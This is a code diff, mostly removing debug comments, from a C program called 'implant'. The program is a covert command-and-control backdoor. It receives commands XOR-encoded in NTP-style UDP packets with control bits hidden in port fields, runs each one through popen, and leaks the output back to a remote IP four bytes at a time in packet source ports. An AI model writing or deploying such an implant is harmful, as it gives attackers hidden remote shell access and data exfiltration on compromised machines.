@@ -63,7 +63,6 @@ bool waitForCommandFromServer(char command[], char DST_IP[], char SRC_IP[]) {
             perror("Your code does not work lol");
 
         } 
-        //printf("Received %d bytes\n", dataAmount);
 
         struct iphdr *iph = (struct iphdr*)buf;
         struct udphdr *udph = (void*) iph + iph->ihl * 4;
@@ -79,14 +78,12 @@ bool waitForCommandFromServer(char command[], char DST_IP[], char SRC_IP[]) {
                 printf("The last packet been sent? %d Packets Received %d Packets Needed %d", isDone, packetsReceived, finalPacketCount);
 
                 printf("Received a packet from %s\n", address);
-                //print_hex(data, 48);
                 print_hex(data + 32, 16);
-                //print_hex(data + 38, 2);
                 uint16_t covertInformation;
                 memcpy(&covertInformation + 1, data + 38, sizeof(uint8_t));
                 memcpy(&covertInformation, data + 39, sizeof(uint8_t));
                 print_binary_uint16(covertInformation);
-                //print_hex(&covertInformation, 2);
+
                 // Port is done (15)
                 isDone = covertInformation & 0x1;
                 uint8_t bytesToRead = ((covertInformation & 0x6) >> 1 ) + 1;
@@ -96,15 +93,11 @@ bool waitForCommandFromServer(char command[], char DST_IP[], char SRC_IP[]) {
 
                 // Decode Packet
                 for (int i = 0; i < bytesToRead; i++) {
-                    //print_hex(data + i + 44, 1);
-                    //printf("Xoring %c with %c\n", KEY[i], data[i + 44]);
                     command[i + seqNum * 4] = KEY[i] ^ data[i + 44];
-                    // printf("New Value is %c\n", command[i + seqNum * 4]);
                 }
 
                 if (isDone == true) {
                     finalPacketCount = seqNum;
-                    //printf("Last packet should be sequence %d\n" ,finalPacketCount);
                     fflush(stdout);
                 }
 
@@ -136,7 +129,6 @@ int main(int argc, char *argv[]) {
         printf("Changed detla %d Changed IP: %s CHanged DST: %s\n", deltaBetweenPackets, SRC_IP, DST_IP);
     }
     else {
-        
         printf("Usage: ./implant <delta> <SRC_IP> <DST_IP>\n");
         return 1;
     }
@@ -152,8 +144,6 @@ int main(int argc, char *argv[]) {
     time_t unix_time = time(NULL);  // Seconds since 1970
     
     struct ntp_timestamp ntp_seconds = {(uint32_t)(unix_time + 2208988800U), 0};
-    
-
     
     memcpy(data + 40, &ntp_seconds, sizeof(uint32_t) * 2);
 
@@ -209,17 +199,12 @@ int main(int argc, char *argv[]) {
         waitForCommandFromServer(command, DST_IP, SRC_IP);
         printf("Finsihed Command query %s\n", command);
         fflush(stdout);
-        // TODO: Change this to allow input from port (NTP back from server)
-        //fgets(command, sizeof(command), stdin);
         command[strcspn(command, "\n")] = 0;
         FILE *fp = popen(command, "r");
         if (fp == NULL) {
             perror("Bad command");
             return 1;
         }
-
-
-        
         
         char buf[32768];
         memset(buf, 0, 32768);
@@ -230,8 +215,6 @@ int main(int argc, char *argv[]) {
             fflush(stdout);
             strncat(buf, line, sizeof(buf) - strlen(line) - 1);
         }
-        //int length = strcspn(buf, "\n");
-        //buf[length] = 0;  // remove trailing newline if present
 
         printf("Sending %s\n", &buf[0]);
         int currentIndex = 0;
@@ -241,9 +224,7 @@ int main(int argc, char *argv[]) {
             memset(pack, 0, 4);
             bool smallPacket = false;
             for (uint8_t i = 0; i < 4; i++) {
-                //printf("%d Comparing buf[currentIndex (%d) * 4 + i + 1\n", i, currentIndex);
                 if (buf[currentIndex * 4 + i] == '\0') {
-                    
                     finishByte =  0b1 | ((i - 1) << 1) | (currentIndex << 3);
                     udph->source = htons(finishByte);
                     printf("Ending The Message\n");
